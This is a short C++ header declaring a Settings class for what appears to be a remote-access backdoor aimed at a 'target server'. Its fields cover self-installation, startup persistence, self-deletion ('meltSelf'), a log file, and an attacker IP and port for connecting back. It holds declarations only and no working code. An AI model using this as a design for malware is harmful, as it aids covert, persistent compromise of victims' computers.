//
// value generale
//

#ifndef SERVEUR___CIBLE_SETTINGS_H
#define SERVEUR___CIBLE_SETTINGS_H
#include <iostream>
class Settings {
public:
    static std::string fileName;
    static std::string folderName;
    static std::string startupName;
    static std::string logFileName;
    static std::string installLocation;

    static bool installSelf;
    static bool setStartupSelf;
    static bool startOnNextBoot;
    static bool meltSelf;

    static const char * adresseipPirate;
    static unsigned short portPirate;


};
#endif //SERVEUR___CIBLE_SETTINGS_H
